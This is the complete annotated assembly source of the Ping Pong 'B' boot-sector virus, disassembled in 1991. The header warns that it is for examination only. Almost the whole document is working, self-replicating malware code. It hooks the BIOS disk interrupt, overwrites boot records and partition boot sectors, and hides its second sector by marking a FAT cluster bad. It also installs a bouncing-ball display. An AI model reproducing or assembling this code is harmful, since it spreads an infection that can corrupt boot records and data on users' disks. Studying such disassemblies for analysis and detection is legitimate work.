TITLE  PINGB.ASM - Ping Pong "B" virus assembly source code

COMMENT #     Read the following carefully:

              THIS FILE IS INTENDED FOR EXAMINATION ONLY.

WARNING: DO *NOT* RUN THE RESULTING COM OR EXE FILE!!!!!!!!!
This virus, when assembled, is (almost) harmless if left in a file.
At best, the code will overwrite part of DOS and hang your machine.
At worst, it could wipe out the Boot record of A: or the master boot
record of your hard disk.  Since the virus MUST be loaded from a boot
sector to function properly, running the code from DOS will definitely
cause problems.

DISCLAIMER: The author will NOT be held responsible for any damages
            caused by careless use of the information presented here.

NOTE: This file, when assembled, will produce a binary image identical
      to the original virus code (except for data areas).  It has a
      few flaws, the biggest of which is described in item 1 of the
      Coding Quirks section, below.  The companion file, PINGB-C.ASM is
      a "cleaned-up" copy of the virus; it corrects all the items under
      the Coding Quirks section.  It should be operationally functional
      to the virus code in this copy.


THEORY OF OPERATION:

1) A disk with the virus is booted.
2) The BIOS memory count is decreased by 2k, to prevent DOS from
   overwriting the virus, and relocates itself to the reserved space.
3) Part II of the virus is read into RAM just after part I.
4) The original boot sector is read to 0000:7C00.
5) Virus gets and saves the address of INT 13h, the BIOS disk service
   interrupt routine, then hooks its own routine in place.
6) The virus jumps to 0000:7C00, load DOS if possible.


INFECTION PROCESS:

1) A BIOS read request is preformed on the target disk.
2) If the drive is different from the last drive that was read from, then
   attempt infection immediately.  Otherwise, check the BIOS clock tick
   count to see if it's time to activate the bouncing ball routine.
3) Read very first sector of the disk.  If it's a hard disk, then search
   for a DOS-12 or DOS-16 partition, and if found, read the first sector
   of THAT partition.  We now have the "normal" boot record of the target
   disk in the sector buffer.
4) Copy the BPB from the boot record to the virus code space.
5) Check virus' signature in the boot record to see if infected before.
   Check disk structure; virus needs 512 byte sectors, and at least 2 sectors
   per cluster to infect the disk.
6) Calculate number of system use sectors, data sectors, and maximum cluster
   number.
7) Starting with the first sector of the FAT, search for a free cluster.
   If none found, then don't infect the disk.
8) The first free cluster is flagged as bad, and the FAT is updated.  Note
   that only the first copy of the FAT will be modified.
9) The original boot sector is re-read and written to the second sector of
   the virus' cluster.  Part II of the virus is written to the first sector.
   Part I is written to sector 0, replacing the original boot record.


INFECTION RESTRICTIONS:

0) The virus cannot infect a write-protected disk (obvious, isn't it?)
1) The virus will not infect a non-DOS bootable hard disk.
2) The virus will only infect a disk with 512 byte sectors, and at least two
   sectors per cluster.  This rules out 1.44M and 1.2M disks, among others.
3) The virus will not infect a disk with no free space (from DOS's view).


CODING QUIRKS:

1) The virus uses a "MOV CS,AX" instruction to continue execution after
   relocating itself to higher memory (see MEMORY MAP, below).  This should
   not work on a 286 or 386 system (the author has not tried it!).
2) The virus uses several "MOV rr,0" instructions (where rr is a 16-bit
   register).  It could be replaced by "XOR rr,0" to save a byte.
3) The virus uses "XOR rr,0FFH" and "INC rr" to negate a value (by first
   computing the ones complement, then adding one to get the twos
   complement.)  This could be replaced by "NEG rr" to save three bytes.
4) The use of OFS_ADJ (see below for computation) is needed to let me use
   an ORG of 0 when assembling the file.  I could've used ORG 07C00h, but
   that would create a file about 32k in size on assembling.  Instead, I
   chose to add this offset manually to force correct address generation.

MEMORY MAP:

The virus will relocate itself 2k below the top of memory.  The virus
itself is 1024 bytes, and uses a 512 byte buffer when infecting other
disks.  In all, the virus uses 1.5k of memory that is 512 bytes below
the BIOS top of memory count.  For a 640k machine the map becomes:

        640.0k (97C0:8400, which is A000:0000) ==> Top of memory
	639.5k (97C0:8200 to 97C0:83FF) ==> Unused
        639.0k (97C0:8000 to 97C0:81FF) ==> Buffer used by virus
        638.5k (97C0:7E00 to 97C0:7FFF) ==> 2nd part of virus code
        638.0k (97C0:7C00 to 97C0:7DFF) ==> Main part of Ping Pong virus

Note that the "clean" version has a different memory map!!

#  End of comment


LOCALS

;The following lines, especially OFS_ADJ, is used to force the assembler to
;generate the correct address for data references.  The virus code is 
;ORG 7C00h, but we are assembling at ORG 0h.  Therefore, we must add
;7C00h to all data references, to make the addresses come out right.
PROGRAM_ASSEMBLY_OFS	EQU 0000H
BOOT_SECTOR_LOAD_OFS	EQU 7C00H

OFS_ADJ			EQU BOOT_SECTOR_LOAD_OFS - PROGRAM_ASSEMBLY_OFS


		LOW_MEM_DATA	SEGMENT AT 0H	;Bottom of memory space
		ORG	0H		;Interrupt vector space
DUMMY_ADDRESS	LABEL	FAR		;Dummy address used for patching

		ORG	0020H
INT8_OFS	DW ?			;INT 8h vector offset & segment
INT8_SEG	DW ?

		ORG	004CH
INT13_OFS	DW ?			;INT 13h vector offset & segment
INT13_SEG	DW ?

		ORG	0413H		;BIOS data area
KB_MEM		DW ?			;K bytes of RAM in machine

		ORG	7C00H		;Jump here to load O/S
BOOT_SECTOR_EXEC	LABEL	FAR

		LOW_MEM_DATA	ENDS

			VIRUS	SEGMENT
			ASSUME	CS:VIRUS,DS:NOTHING,ES:NOTHING
			ORG	0H

START_HERE:
	JMP SHORT CODE_START		;Force a two byte relative JuMp
NOP_INST:
	NOP     
OEM_ID		DB 'PingPong'		;Must be eight characters long!
BYTES_PER_SEC	DW 512
SEC_PER_CLU	DB 2
RES_SECTORS	DW 1
FAT_COPIES	DB 2
DIR_ENTRIES	DW 112			;This is a standard
TOTAL_SECTORS	DW 720			; BIOS Parameter Block!
MEDIA_DESCRIP	DB 0FDH
SEC_PER_FAT	DW 2
SEC_PER_TRK	DW 9
SIDES_ON_DISK	DW 2
HIDDEN_SECTORS	DW 0

		ORG 001EH		;Must ORGinate at offset 1Eh
CODE_START:
	XOR AX,AX
	MOV SS,AX			;Set up stack pointer
	MOV SP,BOOT_SECTOR_LOAD_OFS
	MOV DS,AX
			ASSUME	DS:LOW_MEM_DATA
	MOV AX,KB_MEM			;Get BIOS's count of available memory
	SUB AX,2			;Reserve 2k for virus's use
	MOV KB_MEM,AX			;Save updated memory Kbyte count

;Shifting the memory Kbyte count left by 6 bits will yield the equivalent
;paragraph count.  The result is the target segment value for relocation.
;Subtracting 07C0h from the segment value will make the segment shift
;downards by 7C00 bytes, which makes offset 7C00h in that segment line
;up with the previous offset 0. 
;For a 640k machine (numbers in parenthesis are decimal equivalents)
;         Original BIOS memory count:   280h  (  640) Kbytes
;         After virus subtracts 2k  :   27Eh  (  638) Kbytes
;         Shifting left by 6 bits   :  9F80h  (40832) paragraphs
;         Subtract 07C0h            :  97C0h  (38848) segment value
	MOV CL,06
	SHL AX,CL			;This is same as multiplying by 64
	SUB AX,07C0H			;Subtract offset divided by 16
	MOV ES,AX			;Use result as segment value
	MOV SI,BOOT_SECTOR_LOAD_OFS
	MOV DI,SI			;Set up index regisetrs for move
	MOV CX,256			;Copy 256 words (ie 512 bytes)
	REP MOVSW

	DB 08EH, 0C8H	;This is a "MOV CS,AX" instruction (See notes below)
;Notes on MOV CS,AX:
;This should be an illegal instruction, and if you go by the book, it
;wouldn't work on a 80x86 processor.  On a 80386 system, it will hang the
;computer, requiring a hard reset or a cold boot.  Apprantly, it works on
;a 8088.  Turbo Assembler 2.0 will flag "MOV CS,AX" as an instruction with
;illegal operands, so, in order to preserve the original virus code, the
;hex bytes of the instruction must be inserted manually into the code stream.

VIRUS_CONT	LABEL	FAR		;Continuation address after move
	PUSH CS
	POP DS				;Set up DS register
			ASSUME	ES:VIRUS,DS:VIRUS
	CALL @@LOAD_PART_2		;try two times to load part 2
  @@LOAD_PART_2:
	XOR AH,AH
	INT 13H				;Reset disk subsystem
	AND Byte Ptr DRIVE+OFS_ADJ,080H	;Force drive number to either A: or C:
	MOV BX,PART2_SECTOR+OFS_ADJ

;The sector read/write routine always uses a fixed offset of 8000h; so to get
;the data into the right place, the segment registers are adjusted instead.
;We want to load part 2 of the virus just after part 1, so the offset normally
;would be 7E00h (ie, 7C00h+200h).  However, since the offset MUST be 8000h,
;we will change ES to be 0200h BYTES lower then it normally would be.
;Segment registers are in paragraphs, so to subtract 0200h BYTES from ES
;only subtract 0020h.
;This gives us a effective offset calculation of  8000h - (20h * 10h) = 7E00h
	PUSH CS
	POP AX			;See note above!!
	SUB AX,20H
	MOV ES,AX		;Move result into ES for read routine

	CALL READ_SECTOR
	MOV BX,PART2_SECTOR+OFS_ADJ	;Sector after part 2 of the virus is
	INC BX				; the original boot record of the disk
	MOV AX,0FFC0H			;Address calculation for sector read:
	MOV ES,AX			;  8000h + (FFC0h * 10h) = 107C00h
	CALL READ_SECTOR		;Trim address to 20 bits, and you
	XOR AX,AX			; get 07C00h, which is 0000:7C00
	MOV FLAGS+OFS_ADJ,AL		;Clear all flags.
	MOV DS,AX
			ASSUME	DS:LOW_MEM_DATA
	MOV AX,INT13_OFS
	MOV BX,INT13_SEG
	MOV Word Ptr INT13_OFS,OFFSET NEW_INT13+OFS_ADJ
	MOV INT13_SEG,CS
	PUSH CS
	POP DS
			ASSUME	DS:VIRUS
	MOV INT13_PATCH+1+OFS_ADJ,AX	;Save original INT 13h vector
	MOV INT13_PATCH+3+OFS_ADJ,BX	; directly into instruction stream
	MOV DL,DRIVE+OFS_ADJ
	JMP BOOT_SECTOR_EXEC		;Load the O/S as normal

;***************************************
WRITE_SECTOR:
	MOV AX,0301H
	JMP SHORT VIRUS_DISK_SERV
READ_SECTOR:
	MOV AX,0201H
  VIRUS_DISK_SERV:			;Command is in AX, DOS sector # in BX
	XCHG AX,BX			;Swap command code and sector number

;Now calculate the physical location of the sector number.  DOS sectors are
;sequential, while the BIOS uses track, head, and sector numbers.
;Method:
; Starting with: AX=DOS sector #
; Dividing by sectors/track: AX=Sides*Tracks   DL=BIOS sector# (after adding 1)
; Move sector number (in DL) to CH for later processing
; Dividing by sides on disk: AX=Track number   DL=Head (Side) number
; Since the track # may be more than 255, we will combine the lower
;  two bits in AH with the sector number in CH.  First shift it left
;  by 6 bits, to get it in the form tt000000, then OR it with CH.
;  AX now has the following format (high to low bit seq.): TTssssss tttttttt
;   ("t" is lower 8 bits of track#, "T" is high order 2 bits of track#,
;    and "s" is bits of sector number. )
; Now copy AX into CX, and reverse the two halves of CX.  Now the track
;  and sector numbers are in their correct locations. (Bits: tttttttt TTssssss)
; The side number is still in DL, so copy it into DH for the BIOS.

	ADD AX,HIDDEN_SECTORS+OFS_ADJ	;Add number of hidden sectors
	XOR DX,DX			; (Clear high word for 32 bit division)
	DIV SEC_PER_TRK+OFS_ADJ		;Divide by sectors/track to get
	INC DL				; sector number in DX.
	MOV CH,DL
	XOR DX,DX
	DIV SIDES_ON_DISK+OFS_ADJ	;Divide what's left in AX by
	MOV CL,06			; # of sides to get a track number
	SHL AH,CL			; in AX and the head number in DX.
	OR AH,CH			;Do some bit shuffling to get the
	MOV CX,AX			; pieces in order...
	XCHG CH,CL
	MOV DH,DL			; and we're done!  (whew!)

	MOV AX,BX			;Move command code back into AX
DISK_SERVICE:
	MOV DL,DRIVE+OFS_ADJ
	MOV BX,8000H			;Offset is fixed.  (See notes above)
	INT 13H
	JNC @@NO_ERR		;If successful, then return to caller normally
	POP AX			;Otherwise, remove caller's return address
  @@NO_ERR:			; and return one lever higher than should.
	RET

NEW_INT13	LABEL	FAR	;New INT 13h handler
	PUSH DS
	PUSH ES
	PUSH AX
	PUSH BX				;Save registers on stack
	PUSH CX
	PUSH DX

	PUSH CS				;Establish our data segment registers
	POP DS
	PUSH CS
	POP ES
			ASSUME	DS:VIRUS,ES:VIRUS
	TEST Byte Ptr FLAGS+OFS_ADJ,01	;Was this INT invoked before?
	JNZ @@END			;If so, ignore this call
	CMP AH,02			;Intercept read requests only
	JNE @@END
	CMP DRIVE+OFS_ADJ,DL		;Check drive number...
	MOV DRIVE+OFS_ADJ,DL		; (also save it for next time)
	JNZ @@INFECT			;...if not the same, infect immediately
	XOR AH,AH
	INT 1AH				;Get clock tick count
	TEST DH,07FH			;Is it the right time to activate
	JNZ @@UPDATE_TICKS		; the bouncing ball display?
	TEST DL,0F0H
	JNZ @@UPDATE_TICKS
	PUSH DX				;Preserve clock tick count
	CALL INST_BALL			;Install the bouncing ball routine,
	POP DX				; if not established already.
  @@UPDATE_TICKS:
	MOV CX,DX			;Find elapsed time since last call
	SUB DX,TICK_COUNT+OFS_ADJ	; to this routine.  Also save tick
	MOV TICK_COUNT+OFS_ADJ,CX	; count for next time.
	SUB DX,36			;If less than 2 seconds have passed,
	JB @@END			; don't infect the disk.
  @@INFECT:
	OR Byte Ptr FLAGS+OFS_ADJ,00000001B	;Set busy flag for INT 13h
	PUSH SI
	PUSH DI
	CALL INFECT_A_DISK		;Attempt to infect target disk
	POP DI
	POP SI
	AND Byte Ptr FLAGS+OFS_ADJ,11111110B	;Clear busy flag.
  @@END:
	POP DX
	POP CX
	POP BX				;Restore caller's registers
	POP AX
	POP ES
	POP DS
INT13_PATCH	LABEL	WORD
	JMP DUMMY_ADDRESS		;Continue with original INT 13h handler

INFECT_A_DISK:
	MOV AX,0201H			;Read one sector...
	MOV DH,0
	MOV CX,0001H			;...the first sector of a disk.
	CALL DISK_SERVICE

;At this point, the sector we just read could be a normal boot record,
;or the partition table of a hard disk.  If it's a boot record from a floppy,
;then proceed to infect it.  Otherwise, we have to find the DOS partition
;of the hard disk and read the boot sector from that partition.  We search
;the partition for a DOS-12 or DOS-16 entry, then, using the beginning
;drive/side/track/sector information, we read the first sector of the
;partition.  That sector will be the required boot record, which we will
;prodeed to process.
	TEST Byte Ptr DRIVE+OFS_ADJ,80H	;Is the disk a Winchester?
	JZ @@FLOPPY			;If so, then we got a partition table.
	MOV SI,OFFSET PARTITION_TABLE+OFS_ADJ
	MOV CX,4
  @@LP:					;Check O/S identification byte:
	CMP Byte Ptr [SI+4],01		; Is it a DOS-12 partition?
	JE @@FOUND			; if so, then continue with infection.
	CMP Byte Ptr [SI+4],04		; Check for a DOS-16 partition.
	JE @@FOUND
	ADD SI,16			;Not this one, go to next partition
	LOOP @@LP
	RET			;No suitable DOS partitions found, so exit.
  @@FOUND:
	MOV DX,[SI]			;Get drive number and side
	MOV CX,[SI+2]			;Get track and sector numbers
	MOV AX,0201H			;Read one sector...
	CALL DISK_SERVICE

  @@FLOPPY:			;A DOS boot record is at CS:8000
	MOV SI,OFFSET _NOP_INST+OFS_ADJ		;Copy BPB to virus' code
	MOV DI,OFFSET NOP_INST+OFS_ADJ		; space at ES:7C00h
	MOV CX,001CH
	REP MOVSB
	CMP Word Ptr _VIRUS_SIG+OFS_ADJ,01357H	;Check virus' signature
	JNE @@INFECT				;Infect if not the same

;It is not known what the following code does; it seems to soem sort of
;error recovery procedure, in case the first attempt at infection failed.
	CMP Byte Ptr _CONTINUATION+OFS_ADJ,0
	JNB @@EXIT
	MOV AX,_SYSTEM_SECTORS+OFS_ADJ
	MOV SYSTEM_SECTORS+OFS_ADJ,AX
	MOV SI,_PART2_SECTOR+OFS_ADJ
	JMP CONT_POINT
  @@EXIT:
	RET				;Exit now; cannot infect this disk

  @@INFECT:
	CMP Word Ptr _BYTES_PER_SEC+OFS_ADJ,512		;512 byte sectors only!
	JNZ @@EXIT
	CMP Byte Ptr _SEC_PER_CLU+OFS_ADJ,2	;At lease 2 sectors per cluster
	JB @@EXIT

;The virus now computes the number of system use sectors and number of data
;sectors.  System use sectors include the Boot Record, FAT copies, root
;directory, and any otherwise reserved sectors.  What's left is the number
;of data sectors.
	MOV CX,_RES_SECTORS+OFS_ADJ		;Get # of reserved sectors
	MOV AL,_FAT_COPIES+OFS_ADJ		;Get # of FAT copies
	CBW					;Convert to word in AX
	MUL Word Ptr _SEC_PER_FAT+OFS_ADJ	;Multiply by sectors/FAT
	ADD CX,AX				;Add result to # reserved sec.

	MOV AX,32				;Each dir entry is 32 bytes
	MUL Word Ptr _DIR_ENTRIES+OFS_ADJ	;Get size of root dir in bytes
	ADD AX,511				;Round up when dividing...
	MOV BX,512				;Divide by 512 to get # sectors
	DIV BX					; the root directory takes.
	ADD CX,AX				;Add to # reserved sectors
	MOV SYSTEM_SECTORS+OFS_ADJ,CX		;(Overflow & remainder ignored)

;The virus now calculates the number of data sectors and clusters.
;If there are more than 4080 clusters, then assume we're using a 16 bit FAT.
	MOV AX,TOTAL_SECTORS+OFS_ADJ		;Get total # of sectors on disk
	SUB AX,SYSTEM_SECTORS+OFS_ADJ		;Subtract # of system sectors
	MOV BL,SEC_PER_CLU+OFS_ADJ		;Get # of sectors in a cluster
	XOR DX,DX				;Clear high order word...
	XOR BH,BH				; and byte for division
	DIV BX					;Divide, to get # of clusters
	INC AX					;Round up by one
	MOV DI,AX				;Save for "find free" routine
	AND Byte Ptr FLAGS+OFS_ADJ,11111011B	;Clear "16 bit FAT" flag.
	CMP AX,0FF0H				;Is # of clusters too high?
	JBE @@1
	OR Byte Ptr FLAGS+OFS_ADJ,00000100B	;If so, set flag for 16 bit FAT
  @@1:
;Now the search for a free cluster begins.
	MOV SI,1		;Counter of now many FAT sectors searched
	MOV BX,RES_SECTORS+OFS_ADJ		;Start with 1st FAT sector
	DEC BX					;Sub 1, because we add 1 later
	MOV CUR_FAT_SECTOR+OFS_ADJ,BX
	MOV Byte Ptr FAT_OFS_ADJ+OFS_ADJ,-2	;Set "cluster overhead"
	JMP SHORT VIRUS_PART2_CONT		;JUMP to part II

			ORG	01F3H
CUR_FAT_SECTOR	DW ?	;Current FAT sector number; used during infection
SYSTEM_SECTORS	DW ?	;Total number of reserved, FAT, and root DIR sectors
FLAGS		DB ?	;Bit mapped flags
DRIVE		DB ?	;Current drive number
PART2_SECTOR	DW ?	;DOS sector number of 2nd part of virus
CONTUATION	DB ?	;??? Continuation flag???
			ORG	01FCH
VIRUS_SIG	DW 01357H		;Virus' signature
BIOS_SIG	DW 0AA55H		;Required signature of all boot sectors


;***************  Second sector of virus code starts here!  ******************;

			ORG	0200H
VIRUS_PART2_CONT:

;Note: DI has maximum cluster number, and SI has current cluster number.
  @@NEXT_SECTOR:
	INC Word Ptr CUR_FAT_SECTOR+OFS_ADJ	;Add one to FAT sector #
	MOV BX,CUR_FAT_SECTOR+OFS_ADJ
	ADD Byte Ptr FAT_OFS_ADJ+OFS_ADJ,2
	CALL READ_SECTOR			;Read the FAT sector
	JMP SHORT @@CHECK			;Check for end of search
  @@FIND_FREE:
;To get an entry for a specific cluster in a FAT table, multiply by 1.5 if
;it's a 12 bit FAT; otherwise multiply by 2.  The virus uses the following:
;multiply the cluster number by 3 if it's a 12 bit FAT, otherwise by 4. Then
;divide by 2.
	MOV AX,3
	TEST Byte Ptr FLAGS+OFS_ADJ,00000100B	;Check for 16 bit FAT
	JZ @@0
	INC AX					;Use 4 if FAT-16
  @@0:
	MUL SI					;Multiply by cluster number
	SHR AX,1				;Divide by 2

;The cluster adjustment value is needed to keep offsets within 512 bytes.
;Since each sector is 0200h bytes, we'll subtract 0200h bytes every time
;we calculate another FAT offset for each subsequent FAT sector.
	SUB AH,FAT_OFS_ADJ+OFS_ADJ		;Subtract cluster adjustment
	MOV BX,AX
	CMP BX,01FFH				;Is offset too high?
	JNB @@NEXT_SECTOR			;If so, go to next sector
	MOV DX,Word Ptr [BX+SECTOR_BUFFER+OFS_ADJ]	;Get entry

;Once we have the cluster entry, we have to adjust it for a FAT-12 if
;necessary.  On a FAT-16, we can use the vlaue directly.
;If it is a 12 bit FAT:
;       Clear upper nibble if cluster number is even.
;	Otherwise, throw out lower nibble and shift down by 4 bits.
	TEST Byte Ptr FLAGS+OFS_ADJ,00000100B	;12 bit FAT check
	JNZ @@2
	MOV CL,04				;Prepare for shift
	TEST SI,1				;Cluster number odd/even check.
	JZ @@1
	SHR DX,CL				;Shift down by 1 nibble if odd.
  @@1:
	AND DH,0FH				;Clear highest nibble.

  @@2:
;A free cluster has an entry of 0.  Using the TEST instruction, we check
;for an entry of 0.  Note that the TEST DX,0FFFFH could be replaced by
;OR DX,DX, saving two bytes.
	TEST DX,0FFFFH
	JZ FREE_FOUND
  @@CHECK:			;See if the maximun cluster number has been
	INC SI			; reached.  If so, then no free cluster has
	CMP SI,DI		; been found, so we can't infect the disk
	JBE @@FIND_FREE
	RET

FREE_FOUND:
;Now that we found a free cluster, we'll set that cluster to "bad" status.
;As before, we test for a 12 bit FAT and adjust the bad cluster flag
;accordingly.
	MOV DX,0FFF7H				;Bad cluster flag.
	TEST Byte Ptr FLAGS+OFS_ADJ,00000100B	;12 bit FAT check.
	JNZ @@0
	AND DH,0FH				;Clear upper nibble
	MOV CL,04
	TEST SI,1				;Cluster number odd/even check.
	JZ @@0
	SHL DX,CL				;Shift by 4 bits if odd.
  @@0:
	OR Word Ptr [BX+SECTOR_BUFFER+OFS_ADJ],DX	;Insert new value.
	MOV BX,CUR_FAT_SECTOR+OFS_ADJ		;Get FAT sector #
	CALL WRITE_SECTOR			;Write modified FAT to disk
	MOV AX,SI				;Get free cluster number to AX
	SUB AX,2				;Subtract cluster number basis
	MOV BL,SEC_PER_CLU+OFS_ADJ		;Get # of sectors/cluster
	XOR BH,BH
	MUL BX					;Multiply to get sector number
	ADD AX,SYSTEM_SECTORS+OFS_ADJ		;Add # system use sectors to
	MOV SI,AX				; get DOS sector # on disk
	MOV BX,0			;Read the boot record from sector 0
	CALL READ_SECTOR
	MOV BX,SI			;Write it out to disk, in the second
	INC BX				; sector of our "bad" cluster
	CALL WRITE_SECTOR
CONT_POINT:
	MOV BX,SI			;SI has first sector of free cluster
	MOV PART2_SECTOR+OFS_ADJ,SI	;Save it
	PUSH CS
	POP AX
	SUB AX,20H			;Adjust segment value so ES:8000 will
	MOV ES,AX			; be the same as CS:7E00h
	CALL WRITE_SECTOR		;Write part 2 of virus to disk
	PUSH CS
	POP AX
	SUB AX,40H			;Now adjust ES so an offset of 8000
	MOV ES,AX			; will point to CS:7C00h
	MOV BX,0			;Write the first part of the virus
	CALL WRITE_SECTOR		; into the boot sector
	RET			;DISK IS NOW INFECTED!!!!

			ORG	02B0H
TICK_COUNT	DW ?
FAT_OFS_ADJ	DB ?

INST_BALL:				;Install bouncing ball routine
	TEST Byte Ptr FLAGS+OFS_ADJ,00000010B	;Installed already?
	JNZ @@EXIT
	OR Byte Ptr FLAGS+OFS_ADJ,00000010B	;Set "installed" flag
	MOV AX,0
	MOV DS,AX
			ASSUME	DS:LOW_MEM_DATA
	MOV AX,INT8_OFS				;Get vector for INT 8h
	MOV BX,INT8_SEG
	MOV INT8_OFS,OFFSET NEW_INT8+OFS_ADJ	;Set vector to point at
	MOV INT8_SEG,CS				; our routine.
	PUSH CS
	POP DS
			ASSUME	DS:VIRUS
	MOV INT8_PATCH+1+OFS_ADJ,AX		;Direcly patch original vecotr
	MOV INT8_PATCH+3+OFS_ADJ,BX		; contents into our code.
  @@EXIT:
	RET

NEW_INT8	LABEL	FAR		;New INT 8 handler
	PUSH DS
	PUSH AX
	PUSH BX				;Save affected registers
	PUSH CX
	PUSH DX

	PUSH CS
	POP DS
	MOV AH,0FH			;Get video mode, page, and # of columns
	INT 10H
	MOV BL,AL			;Move mode number into BL
;If the video mode and page are the same as last time, then continue bouncing
;the ball.  Otherwise, reset the ball position and increment, and start anew.
;Note: The active page number is in BH throughout this routine.
	CMP BX,VIDEO_PARAMS+OFS_ADJ	;Is mode and page same as last time?
	JE @@SAME_MODE
	MOV VIDEO_PARAMS,BX		;Save for futore reference (!!)
	DEC AH				;Subtract 1 from number of columns
	MOV SCRN_COLS+OFS_ADJ,AH	; onscreen and save it.
	MOV AH,1			;Assume graphics mode.
	CMP BL,7			;Mono text mode?
	JNE @@0
	DEC AH				;Set flag to 0 if so.
  @@0:
	CMP BL,4			;Is mode number below 4? (ie. 0-3)
	JNB @@1
	DEC AH
  @@1:
	MOV GRAF_MODE+OFS_ADJ,AH	;Save flag value.
	MOV Word Ptr BALL_POS+OFS_ADJ,0101H	;Set XY position to 1,1
	MOV Word Ptr BALL_INC+OFS_ADJ,0101H	;Set XY increment to 1,1
	MOV AH,03H
	INT 10H				;Read cursor position into DX
	PUSH DX				; and save it on the stack.
	MOV DX,BALL_POS			;Get XY position of ball.
	JMP SHORT UPDATE_BALL_POS	;Change increment if needed.

  @@SAME_MODE:				;Enter here if mode not changed.
	MOV AH,03H
	INT 10H				;Get cursor position into DX
	PUSH DX				; and save it.
	MOV AH,02
	MOV DX,BALL_POS+OFS_ADJ
	INT 10H				;Move to bouncing ball location.
	MOV AX,ORG_CHAR+OFS_ADJ		;Get original screen char & attribute.
	CMP Byte Ptr GRAF_MODE+OFS_ADJ,1	;Check for graphics mode/
	JNE @@3
	MOV AX,8307H			;If graphics mode, use CHR$(7)
  @@3:					;If not, then use original char
	MOV BL,AH			;Move color value into BL
	MOV CX,1			;Write one character
	MOV AH,09H			; with attributes and all
	INT 10H				; into page in BH.

;The update routine will check for the ball's position on a screen border.
;If it's on a border, then negate the increment for that direction.
;(ie, if the ball was moving up, reverse it.)  If the increment was not
;changed, then "randomly" change the X or Y increment based on the lower
;three bits of the previous screen character.  This will make the ball
;appear to bounce around "randomly" on a screen filled with characters.

;Note that the ineffecient instructions "XOR rr,0FFH" and "INC rr" can be
;replaced by "NEG rr" (where rr is a register.)  This will save 3 bytes
;for every occurance.
UPDATE_BALL_POS:			;Figure new ball position.
	MOV CX,BALL_INC+OFS_ADJ		;Get ball position increment.
	CMP DH,0			;Is is on the top row of the screen?
	JNZ @@0
	XOR CH,0FFH			;Make a ones-complement of the value,
	INC CH				; then add 1 to make a twos-comp.
  @@0:
	CMP DH,24			;Reached bottom edge?
	JNZ @@1
	XOR CH,0FFH			;See above!
	INC CH
  @@1:
	CMP DL,0			;Reached left edge?
	JNZ @@2
	XOR CL,0FFH			;See above!
	INC CL
  @@2:
	CMP DL,SCRN_COLS+OFS_ADJ	;Reached right edge?
	JNZ @@3
	XOR CL,0FFH			;Should be familar by now!
	INC CL
  @@3:
	CMP CX,BALL_INC+OFS_ADJ		;Is the increment the same as before?
	JNE CALC_NEW_POS		;If not, apply the modified increment.
	MOV AX,ORG_CHAR+OFS_ADJ		;Do "ramdom" updating, as described
	AND AL,00000111B		; in the note above.
	CMP AL,00000011B
	JNE @@4
	XOR CH,0FFH			;Reverse Y direction.
	INC CH
  @@4:
	CMP AL,00000101B
	JNE CALC_NEW_POS
	XOR CL,0FFH			;Reverse X direction.
	INC CL

CALC_NEW_POS:
	ADD DL,CL			;Add increments to ball position.
	ADD DH,CH
	MOV BALL_INC+OFS_ADJ,CX		;Save ball position increment and
	MOV BALL_POS+OFS_ADJ,DX		; new ball position.
	MOV AH,02H			;Move to ball position, which is
	INT 10H				; in register DX.
	MOV AH,08H			;Read the present screen char and
	INT 10H				; attribute.
	MOV ORG_CHAR+OFS_ADJ,AX		;Save them for next time.
	MOV BL,AH			;Use same attribute, if in text mode
	CMP Byte Ptr GRAF_MODE+OFS_ADJ,1
	JNE @@0
	MOV BL,83H			;Otherwise, use color # 83H
  @@0:
	MOV CX,0001H			;Write one character and attribute
	MOV AX,0907H			; using CHR$(7) as the character.
	INT 10H
	POP DX				;Get old cursor position.
	MOV AH,02H			;Move cursor back to that position.
	INT 10H
	POP DX
	POP CX
	POP BX				;Restore affected registers.
	POP AX
	POP DS
INT8_PATCH	LABEL	WORD
	JMP DUMMY_ADDRESS		;Continue with original INT 8h handler.

ORG_CHAR	DW ?		;Original screen character and attribute.
BALL_POS	DW ?		;Bouncing ball's XY position.
BALL_INC	DW ?		;Ball's XY increment
GRAF_MODE	DB ?		;1 = graphics mode, otherwise it's a text mode.
VIDEO_PARAMS	DW ?		;Mode number and page number.
SCRN_COLS	DB ?		;Number of screen columns minus 1

VIRUS_LENGTH	EQU $-START_HERE
		DB 1024-VIRUS_LENGTH DUP (0)		;Pad out to 1024 bytes.

;******************** End of virus code! **************************************

			ORG	0400H	;Work area for the virus
SECTOR_BUFFER	LABEL	NEAR		;This is a sector buffer!!
_JMP_INST	DW ?
_NOP_INST	DB ?

_OEM_ID		DB 8 DUP(?)
_BYTES_PER_SEC	DW ?
_SEC_PER_CLU	DB ?
_RES_SECTORS	DW ?
_FAT_COPIES	DB ?
_DIR_ENTRIES	DW ?			;This is the BPB of the target
_TOTAL_SECTORS	DW ?			; disk during infection.
_MEDIA_DESCRIP	DB ?
_SEC_PER_FAT	DW ?
_SEC_PER_TRK	DW ?
_SIDES_ON_DISK	DW ?
_HIDDEN_SECTORS	DW ?

			ORG	05BEH
PARTITION_TABLE	LABEL	NEAR

			ORG	05F3H
_CUR_FAT_SECTOR	DW ?
_SYSTEM_SECTORS	DW ?
_FLAGS		DB ?
_DRIVE		DB ?
_PART2_SECTOR	DW ?
_CONTINUATION	DB ?
			ORG	05FCH
_VIRUS_SIG	DW ?
_BIOS_SIG	DW ?			;Should always be 0AA55h
			VIRUS	ENDS
			END

;Disassembled by James L.  July 1991
;# EOF #;
